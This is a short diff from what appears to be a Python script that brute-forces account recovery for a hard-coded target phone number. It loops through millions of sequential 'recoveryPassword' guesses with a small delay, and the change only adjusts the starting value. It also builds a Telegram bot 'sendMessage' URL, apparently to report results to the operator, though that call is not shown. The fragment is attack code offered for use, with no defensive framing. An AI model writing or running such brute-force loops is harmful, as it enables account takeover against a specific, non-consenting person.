@@ -8,7 +8,7 @@ url2 = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
 target_phone = "772490746"
 for i in range(9999999):
     time.sleep(0.2)
-    zee = 445619
+    zee = 4456190
     data = {
         "username": target_phone,"recoveryPassword": str(zee + i)
         
